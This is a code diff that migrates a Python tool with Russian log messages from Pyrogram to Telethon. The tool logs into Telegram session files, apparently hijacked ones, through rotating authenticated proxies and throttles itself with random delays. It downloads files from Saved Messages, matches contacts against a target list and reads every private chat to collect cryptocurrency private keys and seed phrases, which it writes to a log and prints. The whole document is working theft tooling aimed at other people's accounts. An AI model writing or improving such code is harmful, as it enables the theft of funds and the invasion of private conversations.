@@ -1,11 +1,14 @@
 import os
 import re
+import socks
 import json
 import asyncio
 import requests
 from datetime import datetime
 from random import choice
-from pyrogram import Client, enums
+
+from telethon import TelegramClient
+from telethon.tl.types import User
 
 from utils.states import Stats
 from utils.time_utils import random_delay
@@ -28,14 +31,14 @@ OUTPUT_FILE = f"{LOGS_DIR}/output_{current_time}.txt"
 stats = Stats()
 
 
-async def download_txt_files_from_saved_messages(app, session_name):
+async def download_txt_files_from_saved_messages(client, session_name):
     try:
-        saved_messages_chat = await app.get_chat("me")
+        saved_messages = await client.get_entity("me")
 
-        async for message in app.get_chat_history(saved_messages_chat.id):
-            if message.document and message.document.file_name.endswith(".txt"):
-                file_path = f"{DOWNLOADS_DIR}/{message.document.file_name}"
-                await app.download_media(message, file_path)
+        async for message in client.iter_messages(saved_messages):
+            if message.document and message.file.name.endswith(".txt"):
+                file_path = os.path.join(DOWNLOADS_DIR, message.file.name)
+                await client.download_media(message, file_path)
                 print(f"Скачан файл: {file_path}")
                 await check_file_contents(file_path, session_name)
                 await random_delay()
@@ -43,14 +46,14 @@ async def download_txt_files_from_saved_messages(app, session_name):
         print(f"Ошибка при скачивании файлов из сохраненных сообщений: {e}")
 
 
-async def check_contacts(app, session_name):
+async def check_contacts(client, session_name):
     try:
         USERNAMES = get_usernames()
         dialogs = []
 
-        async for dialog in app.get_dialogs():
-            if dialog.chat.username:
-                dialogs.append(dialog.chat.username)
+        async for dialog in client.iter_dialogs():
+            if dialog.entity.username:
+                dialogs.append(dialog.entity.username)
 
         for username in USERNAMES:
             if username.lstrip("@") in dialogs:
@@ -125,6 +128,7 @@ async def check_text(text, session_name):
                         stats.total_privkeys += 1
                         stats.combined_findings += 1
                     write_to_file(OUTPUT_FILE, f"Найден {key_type} ключ: {match}")
+                    print(f"Найден {key_type} ключ: {match}")
             write_to_file(OUTPUT_FILE, "")
 
         if is_valid_mnemonic(text):
@@ -133,6 +137,7 @@ async def check_text(text, session_name):
             stats.total_seeds += 1
             stats.combined_findings += 1
             write_to_file(OUTPUT_FILE, f"Найдена сид фраза: {text}")
+            print(f"Найдена сид фраза: {text}")
             write_to_file(OUTPUT_FILE, "")
 
         if stats.combined_findings >= 10:
@@ -168,8 +173,8 @@ async def check_message(message, session_name):
             await check_text(message.text, session_name)
             await random_delay()
 
-        if message.photo and message.caption:
-            await check_text(message.caption, session_name)
+        if message.photo and message.text:
+            await check_text(message.text, session_name)
             await random_delay()
     except Exception as e:
         print(f"Ошибка при проверке сообщения: {e}")
@@ -195,80 +200,57 @@ async def process_session(session_path, session_name):
         print(f"Пропуск сессии {session_name}: отсутствуют api_id или api_hash")
         return
 
-    # пробуем найти рабочий прокси
-    proxy = None
     max_proxy_attempts = 3
     proxy_attempts = 0
 
     while proxy_attempts < max_proxy_attempts:
         try:
-            proxy = parse_proxy(choice(PROXIES))
-            if not proxy:
+            proxy_data = parse_proxy(choice(PROXIES))
+            if not proxy_data:
                 print(f"Пропуск прокси: неверный формат")
                 proxy_attempts += 1
                 continue
 
-            print(
-                f"Сессия {session_name} использует прокси: {proxy['hostname']}:{proxy['port']}"
-            )
+            if proxy_data:
+                proxy_type, host, port, user, password = proxy_data
+                proxy = (
+                    socks.HTTP,
+                    host,
+                    port,
+                    True,
+                    user,
+                    password,
+                )  # HTTP с авторизацией
+
+            print(f"Сессия {session_name} использует прокси: {proxy[1]}:{proxy[2]}")
 
             try:
-                async with Client(session_path, api_id, api_hash, proxy=proxy) as app:
+                async with TelegramClient(
+                    session_path, api_id, api_hash, proxy=proxy
+                ) as client:
                     print(
-                        f"Сессия {session_name} использует прокси: {proxy['hostname']}:{proxy['port']}"
+                        f"Сессия {session_name} успешно подключилась через {proxy[1]}:{proxy[2]}"
                     )
-                    await download_txt_files_from_saved_messages(app, session_name)
-                    print(f"Сессия {session_name} успешно скачала файл")
-                    await random_delay()
+                    await download_txt_files_from_saved_messages(client, session_name)
+                    await check_contacts(client, session_name)
 
-                    await check_contacts(app, session_name)
-                    await random_delay()
-
-                    async for dialog in app.get_dialogs():
-                        if dialog.chat.type == enums.ChatType.PRIVATE:
+                    async for dialog in client.iter_dialogs():
+                        print(
+                            f"Сессия {session_name} проверяет диалог {dialog.entity.id}"
+                        )
+                        if isinstance(dialog.entity, User):
                             try:
-                                print(
-                                    f"Сессия {session_name} проверяет личный диалог с {dialog.chat.id}"
-                                )
-                                try:
-                                    async for message in app.get_chat_history(
-                                        dialog.chat.id
-                                    ):
-                                        await check_message(message, session_name)
-                                        await random_delay()
-                                except:
-                                    pass
-                            except Exception as chat_error:
-                                # print(
-                                #     f"Ошибка при обработке диалога {dialog.chat.id}: {chat_error}"
-                                # )
-                                continue
-
+                                async for message in client.iter_messages(
+                                    dialog.entity.id
+                                ):
+                                    await check_message(message, session_name)
+                                    await random_delay()
+                            except Exception as e:
+                                print(f"Ошибка при проверке сообщения: {e}")
                 stats.processed_sessions += 1
                 break
 
             except Exception as e:
-                error_message = str(e)
-                invalid_session_errors = {
-                    "SESSION_REVOKED": "session_revoked",
-                    "AUTH_KEY_UNREGISTERED": "auth_key_unregistered",
-                    "USER_DEACTIVATED_BAN": "user_deactivated",
-                    "AUTH_KEY_DUPLICATED": "auth_key_duplicated",
-                    "CHANNEL_PRIVATE": "channel_private",
-                }
-
-                for error_text, error_type in invalid_session_errors.items():
-                    if error_text in error_message:
-                        if error_text == "CHANNEL_PRIVATE":
-                            return
-
-                        print(
-                            f"Пропуск сессии {session_name}: Аккаунт невалид. Причина: {error_text}"
-                        )
-                        update_invalid_sessions_stats(session_name, error_type)
-                        stats.invalid_sessions += 1
-                        return
-
                 print(f"Ошибка при обработке сессии {session_name}: {e}")
                 proxy_attempts += 1
                 continue
